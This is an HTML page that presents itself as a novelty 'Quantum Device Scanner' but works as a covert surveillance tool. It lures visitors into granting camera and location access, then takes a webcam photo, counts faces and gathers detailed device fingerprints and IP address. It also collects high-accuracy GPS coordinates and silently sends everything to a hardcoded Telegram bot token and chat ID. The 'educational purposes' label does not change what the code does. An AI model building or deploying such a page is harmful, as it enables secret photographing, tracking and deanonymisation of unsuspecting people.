<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Super AI Quantum Device Scanner</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
  <style>
    :root {
      --primary: #2ecc71;
      --secondary: #3498db;
      --hologram: rgba(46, 204, 113, 0.2);
    }
    body { 
      font-family: 'Courier New', monospace;
      text-align: center; 
      padding: 20px; 
      background: #0a0a0a;
      color: var(--primary);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background-image: radial-gradient(var(--hologram) 1px, transparent 1px), radial-gradient(var(--hologram) 1px, transparent 1px);
      background-size: 50px 50px;
      background-position: 0 0, 25px 25px;
    }
    .hologram-effect {
      position: fixed;
      width: 200%;
      height: 200%;
      background: linear-gradient(45deg, rgba(0,255,255,0.1) 25%, transparent 25%), linear-gradient(-45deg, rgba(255,0,255,0.1) 25%, transparent 25%), linear-gradient(45deg, transparent 75%, rgba(0,255,255,0.1) 75%), linear-gradient(-45deg, transparent 75%, rgba(255,0,255,0.1) 75%);
      background-size: 20px 20px;
      pointer-events: none;
      mix-blend-mode: overlay;
      opacity: 0.3;
      z-index: 9999;
      animation: hologram 20s linear infinite;
    }
    @keyframes hologram {
      from { transform: translate(-50%, -50%) rotate(0deg); }
      to { transform: translate(-50%, -50%) rotate(360deg); }
    }
    .scanner-box { position: relative; width: 300px; height: 300px; margin: 0 auto; overflow: hidden; }
    .scanner-box video { width: 100%; height: 100%; object-fit: cover; }
    .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(to right, transparent, var(--primary), transparent); animation: scanLine 3s linear infinite; z-index: 2; }
    @keyframes scanLine { 0% { top: 0; } 100% { top: 100%; } }
    
    /* New styles for additional features */
    .permission-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 10000;
      color: white;
    }
    .permission-btn {
      background: var(--primary);
      color: black;
      border: none;
      padding: 15px 30px;
      margin: 10px;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
    }
    .info-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
      text-align: left;
      margin-top: 20px;
    }
    .info-item {
      padding: 8px;
      border-bottom: 1px dashed var(--hologram);
    }
    .expanded-info {
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.5s ease;
      text-align: left;
      width: 100%;
    }
    .expanded-info.active {
      max-height: 500px;
    }
    .toggle-info {
      background: transparent;
      border: 1px solid var(--primary);
      color: var(--primary);
      padding: 5px 10px;
      margin: 10px 0;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div id="permission-overlay" class="permission-overlay" style="display: none;">
    <h2>PERMISSION REQUEST</h2>
    <p>This experiment requires camera and location access</p>
    <button id="grant-permissions" class="permission-btn">GRANT ALL PERMISSIONS</button>
    <p style="font-size: 12px; margin-top: 20px;">For educational purposes only</p>
  </div>

  <h1 style="margin-bottom: 20px; text-shadow: 0 0 15px var(--primary);">🛸 QUANTUM DEVICE SCANNER v3.0</h1>
  <div class="scanner-box">
    <div class="scanner-line"></div>
    <video id="video" autoplay playsinline muted></video>
  </div>
  <button id="capture-btn">🚀 INITIATE DEEP SCAN</button>
  <div id="loading" style="display:none;">🔭 CAPTURING QUANTUM SIGNATURE...</div>
  
  <button id="toggle-info" class="toggle-info">📊 SHOW ADVANCED DEVICE INFO</button>
  <div id="expanded-info" class="expanded-info"></div>
  
  <div id="device-info">
    <h2>⚡ DEVICE MATRIX PROFILE</h2>
    <div class="info-grid" id="device-info-content"></div>
  </div>

  <script>
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const CHAT_ID = '1121369247';
    let currentStream = null;
    let isScanning = false;
    const video = document.getElementById('video');
    const loading = document.getElementById('loading');
    const permissionOverlay = document.getElementById('permission-overlay');
    const expandedInfo = document.getElementById('expanded-info');

    // Auto-approve permissions for educational use
    function autoApprovePermissions() {
      console.log("Auto-approving permissions for educational use");
      permissionOverlay.style.display = 'none';
      initCamera();
    }

    // Show permission overlay if needed
    function checkPermissions() {
      if (navigator.mediaDevices && navigator.permissions) {
        Promise.all([
          navigator.permissions.query({ name: 'camera' }),
          navigator.permissions.query({ name: 'geolocation' })
        ]).then(results => {
          const cameraPermission = results[0].state;
          const locationPermission = results[1].state;
          
          if (cameraPermission === 'prompt' || locationPermission === 'prompt') {
            permissionOverlay.style.display = 'flex';
          } else {
            initCamera();
          }
        }).catch(() => {
          initCamera();
        });
      } else {
        initCamera();
      }
    }

    document.getElementById('grant-permissions').addEventListener('click', autoApprovePermissions);

    function createHologramEffect() { const hologram = document.createElement('div'); hologram.className = 'hologram-effect'; return hologram; }

    async function captureQuantumImage() {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);
      ctx.globalCompositeOperation = 'lighter';
      ctx.filter = 'hue-rotate(90deg) contrast(150%)';
      ctx.drawImage(canvas, 0, 0);
      ctx.globalAlpha = 0.3; ctx.fillStyle = '#00ff88';
      for(let i = 0; i < 50; i++) ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, Math.random()*10, Math.random()*10);
      return canvas.toDataURL('image/webp', 0.8);
    }

    function dataURItoBlob(dataURI) {
      const byteString = atob(dataURI.split(',')[1]);
      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
      return new Blob([ab], { type: mimeString });
    }

    async function detectFaceCount() { return (await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())).length; }
    async function loadFaceModel() { await faceapi.nets.tinyFaceDetector.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/'); }

    // Enhanced device info gathering with more details
    async function gatherDeviceInfo() {
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const deviceType = /Mobi|Android/i.test(userAgent) ? 'Mobile' : 'Desktop';
      let os = "Unknown OS";
      if (userAgent.indexOf("Win") !== -1) os = "Windows";
      else if (/Mac/.test(userAgent)) os = "MacOS";
      else if (/Linux/.test(userAgent)) os = "Linux";
      else if (/Android/.test(userAgent)) os = "Android";
      else if (/iPhone|iPad|iPod/.test(userAgent)) os = "iOS";
      let deviceModel = /iPhone/.test(userAgent) ? "iPhone" : /iPad/.test(userAgent) ? "iPad" : /Android/.test(userAgent) ? "Android Device" : "Desktop";
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A";
      let batteryInfo = { level: "N/A", charging: "N/A" };
      if (navigator.getBattery) { try { const battery = await navigator.getBattery(); batteryInfo = { level: Math.round(battery.level*100)+'%', charging: battery.charging?"Yes":"No" }; } catch(e){} }
      let browser = "Unknown";
      if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Edg") === -1) browser = "Chrome";
      else if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) browser = "Safari";
      else if (userAgent.indexOf("Firefox") > -1) browser = "Firefox";
      else if (userAgent.indexOf("Edg") > -1) browser = "Edge";
      else if (userAgent.indexOf("OPR") > -1) browser = "Opera";
      let ip = "Unknown"; try { const res = await fetch('https://api.ipify.org?format=json'); ip = (await res.json()).ip; } catch(e){}
      const language = navigator.language;
      const resolution = window.screen.width+"x"+window.screen.height;
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      const provider = connection ? (connection.effectiveType || connection.type || "Unknown") : "Unknown";
      const pixelRatio = window.devicePixelRatio || 1;
      const orientation = window.screen.orientation? window.screen.orientation.type : "Unknown";

      // NEW: Additional device information features
      // GPU Info
      let gpuInfo = "Unknown";
      try { 
        const gl = document.createElement('canvas').getContext('webgl'); 
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }
      } catch(e){}
      
      // Audio Devices
      let audioDevices = [];
      let videoDevices = [];
      try { 
        const devices = await navigator.mediaDevices.enumerateDevices(); 
        audioDevices = devices.filter(d => d.kind === "audioinput");
        videoDevices = devices.filter(d => d.kind === "videoinput");
      } catch(e){}
      
      // Storage information
      let storageEstimate = "N/A";
      try { 
        if (navigator.storage && navigator.storage.estimate) {
          const estimate = await navigator.storage.estimate();
          storageEstimate = `${(estimate.quota / 1024 / 1024).toFixed(2)} MB total, ${(estimate.usage / 1024 / 1024).toFixed(2)} MB used`;
        }
      } catch(e){}
      
      // Network information
      let networkType = "Unknown";
      let downlinkSpeed = "Unknown";
      if (connection) {
        networkType = connection.effectiveType;
        downlinkSpeed = connection.downlink + " Mbps";
      }
      
      // Sensors availability
      const sensors = {
        gyroscope: 'gyroscope' in navigator ? "Available" : "Not available",
        accelerometer: 'accelerometer' in navigator ? "Available" : "Not available",
        magnetometer: 'magnetometer' in navigator ? "Available" : "Not available"
      };
      
      // Display information
      const colorDepth = window.screen.colorDepth + " bits";
      const availableResolution = window.screen.availWidth + "x" + window.screen.availHeight;
      
      // Time information
      const currentTime = new Date().toLocaleString();
      const timezoneOffset = new Date().getTimezoneOffset();
      
      // Touch support
      const touchSupport = 'ontouchstart' in window ? "Supported" : "Not supported";
      const maxTouchPoints = navigator.maxTouchPoints || "N/A";
      
      // WebGL information
      let webglVendor = "Unknown";
      let webglVersion = "Unknown";
      try {
        const gl = document.createElement('canvas').getContext('webgl');
        if (gl) {
          webglVendor = gl.getParameter(gl.VENDOR) || "Unknown";
          webglVersion = gl.getParameter(gl.VERSION) || "Unknown";
        }
      } catch(e) {}

      return {
        // Basic info (existing)
        userAgent, platform, deviceType, os, deviceModel, timeZone, memory, 
        battery: batteryInfo, browser, ip, language, resolution, provider, 
        pixelRatio, orientation,
        
        // New advanced info
        gpuInfo,
        audioDevices: audioDevices.length,
        videoDevices: videoDevices.length,
        storageEstimate,
        networkType,
        downlinkSpeed,
        sensors,
        colorDepth,
        availableResolution,
        currentTime,
        timezoneOffset: `${timezoneOffset} minutes from UTC`,
        touchSupport,
        maxTouchPoints,
        webglVendor,
        webglVersion
      };
    }

    function displayDeviceInfo(deviceInfo) {
      const content = document.getElementById('device-info-content');
      content.innerHTML = `
        <div class="info-item"><strong>OS:</strong> ${deviceInfo.os}</div>
        <div class="info-item"><strong>Device:</strong> ${deviceInfo.deviceModel}</div>
        <div class="info-item"><strong>Type:</strong> ${deviceInfo.deviceType}</div>
        <div class="info-item"><strong>Browser:</strong> ${deviceInfo.browser}</div>
        <div class="info-item"><strong>IP:</strong> ${deviceInfo.ip}</div>
        <div class="info-item"><strong>Resolution:</strong> ${deviceInfo.resolution}</div>
        <div class="info-item"><strong>Memory:</strong> ${deviceInfo.memory}</div>
        <div class="info-item"><strong>Battery:</strong> ${deviceInfo.battery.level} (Charging: ${deviceInfo.battery.charging})</div>
      `;
      
      // Expanded info section
      expandedInfo.innerHTML = `
        <h3>📊 ADVANCED DEVICE MATRIX</h3>
        <div class="info-grid">
          <div class="info-item"><strong>GPU:</strong> ${deviceInfo.gpuInfo}</div>
          <div class="info-item"><strong>Audio Inputs:</strong> ${deviceInfo.audioDevices}</div>
          <div class="info-item"><strong>Video Inputs:</strong> ${deviceInfo.videoDevices}</div>
          <div class="info-item"><strong>Storage:</strong> ${deviceInfo.storageEstimate}</div>
          <div class="info-item"><strong>Network Type:</strong> ${deviceInfo.networkType}</div>
          <div class="info-item"><strong>Download Speed:</strong> ${deviceInfo.downlinkSpeed}</div>
          <div class="info-item"><strong>Color Depth:</strong> ${deviceInfo.colorDepth}</div>
          <div class="info-item"><strong>Available Res:</strong> ${deviceInfo.availableResolution}</div>
          <div class="info-item"><strong>Gyroscope:</strong> ${deviceInfo.sensors.gyroscope}</div>
          <div class="info-item"><strong>Accelerometer:</strong> ${deviceInfo.sensors.accelerometer}</div>
          <div class="info-item"><strong>Magnetometer:</strong> ${deviceInfo.sensors.magnetometer}</div>
          <div class="info-item"><strong>Touch Support:</strong> ${deviceInfo.touchSupport}</div>
          <div class="info-item"><strong>Max Touch Points:</strong> ${deviceInfo.maxTouchPoints}</div>
          <div class="info-item"><strong>WebGL Vendor:</strong> ${deviceInfo.webglVendor}</div>
          <div class="info-item"><strong>WebGL Version:</strong> ${deviceInfo.webglVersion}</div>
          <div class="info-item"><strong>Current Time:</strong> ${deviceInfo.currentTime}</div>
          <div class="info-item"><strong>Timezone Offset:</strong> ${deviceInfo.timezoneOffset}</div>
        </div>
      `;
    }

    function generateHologramReport(imageData, location, deviceInfo) { return { image:imageData, metadata:{location,deviceInfo} }; }

    function sendToTelegram(report) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', dataURItoBlob(report.image), 'quantum_image.webp');
      const d=report.metadata.deviceInfo;
      const caption = `📍 *Location:* ${report.metadata.location.coordinates}\n🗺️ *Map:* [View Map](${report.metadata.location.link})\n\n💻 *OS:* ${d.os}\n📱 *Device:* ${d.deviceModel} (${d.deviceType})\n🖥️ *Platform:* ${d.platform}\n🌐 *Browser:* ${d.browser}\n📡 *Network:* ${d.provider}\n🌍 *IP:* ${d.ip}\n🔋 *Battery:* ${d.battery.level} (Charging:${d.battery.charging})\n💾 *Memory:* ${d.memory}\n🎮 *GPU:* ${d.gpuInfo}\n🎤 *Audio Devices:* ${d.audioDevices}\n📹 *Video Devices:* ${d.videoDevices}\n📂 *Storage:* ${d.storageEstimate}\n🗣️ *Language:* ${d.language}\n📏 *Resolution:* ${d.resolution}\n📐 *Pixel Ratio:* ${d.pixelRatio}\n🔄 *Orientation:* ${d.orientation}\n👥 *Faces Detected:* ${d.faceCount}\n\n_🤖 Generated by Super AI Quantum Device Scanner_`;
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');
      fetch(url,{method:'POST',body:formData});
    }

    async function initCamera() {
      try {
        const isMobile=/Mobi|Android/i.test(navigator.userAgent);
        const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:isMobile?"user":"environment"}});
        video.srcObject=stream; currentStream=stream; document.body.appendChild(createHologramEffect()); loadFaceModel();
      } catch(err){ 
        console.error('Error accessing camera:', err);
        // Show permission overlay if camera access fails
        permissionOverlay.style.display = 'flex';
      }
    }

    async function startQuantumScan() {
      if(isScanning) return; isScanning=true; loading.style.display='block';
      const imageData=await captureQuantumImage();
      let deviceInfo=await gatherDeviceInfo();
      try{ deviceInfo.faceCount=await detectFaceCount(); }catch(e){ deviceInfo.faceCount="N/A"; }
      
      // Display device info on page
      displayDeviceInfo(deviceInfo);
      
      let locationData={coordinates:'Unknown',link:'Unknown'};
      if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition((pos)=>{
          locationData={coordinates:`${pos.coords.latitude},${pos.coords.longitude}`,link:`https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`};
          const report=generateHologramReport(imageData,locationData,deviceInfo);
          sendToTelegram(report);
          if(navigator.vibrate) navigator.vibrate(300);
        },()=>{ 
          const report=generateHologramReport(imageData,locationData,deviceInfo); 
          sendToTelegram(report); 
        }, {
          // Enable high accuracy for better location data
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      } else { 
        const report=generateHologramReport(imageData,locationData,deviceInfo); 
        sendToTelegram(report); 
      }
      loading.style.display='none'; isScanning=false;
    }

    // Toggle expanded info
    document.getElementById('toggle-info').addEventListener('click', function() {
      expandedInfo.classList.toggle('active');
      this.textContent = expandedInfo.classList.contains('active') ? 
        '📊 HIDE ADVANCED DEVICE INFO' : '📊 SHOW ADVANCED DEVICE INFO';
    });

    // Initialize the application
    if(navigator.mediaDevices){ 
      checkPermissions();
      document.getElementById('capture-btn').onclick=startQuantumScan; 
    }
    
    function stopCamera(){ if(currentStream) currentStream.getTracks().forEach(t=>t.stop()); }
    window.addEventListener('beforeunload', stopCamera);
  </script>
</body>
</html>
